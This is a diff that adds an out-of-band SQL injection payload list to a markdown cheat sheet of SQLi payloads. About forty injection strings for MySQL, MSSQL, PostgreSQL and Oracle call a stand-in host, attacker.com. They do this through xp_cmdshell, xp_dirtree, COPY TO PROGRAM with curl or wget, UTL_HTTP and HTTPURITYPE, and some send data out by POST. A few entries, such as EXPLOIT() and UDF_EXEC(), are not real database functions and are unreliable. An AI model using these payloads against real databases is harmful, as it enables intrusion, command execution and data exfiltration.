@@ -233,5 +233,56 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 
 ---
 
+## 📋 Out-of-Band (OOB) SQLi Payloads
+
+### MySQL
+- `' UNION SELECT 1,LOAD_FILE('\\\\attacker.com\\payload') --`
+- `' AND LOAD_FILE('\\\\attacker.com\\payload') --`
+- `' AND EXPLOIT('http://attacker.com/payload') --`
+- `' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
+- `' INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
+- `' UNION SELECT LOAD_FILE('\\\\attacker.com\\payload.txt') --`
+- `' INTO DUMPFILE '\\\\attacker.com\\dump.txt' --`
+- `' INTO OUTFILE '\\\\attacker.com\\data.txt' --`
+- `' AND UDF_EXEC('http://attacker.com/payload') --`
+- `' UNION SELECT 1,2,3,4 INTO OUTFILE '\\\\attacker.com\\data.txt' --`
+
+### MSSQL
+- `' ; EXEC xp_dirtree '\\\\attacker.com\\payload' --`
+- `' ; EXEC xp_fileexist '\\\\attacker.com\\payload' --`
+- `' ; EXEC xp_cmdshell 'ping attacker.com' --`
+- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\payload' --`
+- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\file' --`
+- `' ; EXEC xp_cmdshell 'curl http://attacker.com/payload' --`
+- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\check' --`
+- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\data.txt' --`
+- `' ; EXEC sp_OACreate 'WScript.Shell','ping attacker.com' --`
+- `' ; EXEC master..xp_cmdshell 'nslookup attacker.com' --`
+
+### PostgreSQL
+- `' ; COPY (SELECT 'OOB Test') TO PROGRAM 'curl http://attacker.com/payload' --`
+- `' ; COPY (SELECT current_user) TO PROGRAM 'curl http://attacker.com/payload' --`
+- `' ; COPY (SELECT version()) TO PROGRAM 'wget http://attacker.com/payload' --`
+- `' ; COPY (SELECT 'data') TO PROGRAM 'ping attacker.com' --`
+- `' ; COPY (SELECT 'check') TO PROGRAM 'curl http://attacker.com/check' --`
+- `' ; COPY (SELECT 'info') TO PROGRAM 'wget http://attacker.com/info' --`
+- `' ; COPY (SELECT 'test') TO PROGRAM 'nslookup attacker.com' --`
+- `' ; COPY (SELECT 'user') TO PROGRAM 'curl -d "data=OOB Test" http://attacker.com' --`
+- `' ; COPY (SELECT 'output') TO PROGRAM 'curl -X POST -d "alert=OOB Test" http://attacker.com' --`
+- `' ; COPY (SELECT 'results') TO PROGRAM 'wget http://attacker.com/results' --`
+
+### Oracle
+- `' AND UTL_HTTP.REQUEST('http://attacker.com/payload') --`
+- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data') FROM DUAL --`
+- `' AND HTTPURITYPE('http://attacker.com/payload').GETCLOB() FROM DUAL --`
+- `' UNION SELECT HTTPURITYPE('http://attacker.com/check').GETCLOB() FROM DUAL --`
+- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --`
+- `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
+- `' AND HTTPURITYPE('http://attacker.com/info').GETCLOB() FROM DUAL --`
+- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/status') FROM DUAL --`
+- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
+- `' AND UTL_HTTP.REQUEST('http://attacker.com/output') --`
+
+---
 
 
